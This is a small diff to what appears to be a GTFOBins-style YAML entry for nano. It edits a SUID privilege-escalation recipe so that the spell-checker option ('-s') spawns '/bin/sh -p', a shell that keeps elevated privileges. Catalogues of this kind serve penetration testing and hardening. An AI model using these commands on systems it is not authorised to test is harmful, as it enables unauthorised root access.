@@ -20,8 +20,8 @@ functions:
   limited-suid:
     - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
       code: |
-        ./nano -s /bin/sh
-        /bin/sh
+        ./nano -s "/bin/sh -p"
+        /bin/sh -p
         ^T
   sudo:
     - code: |
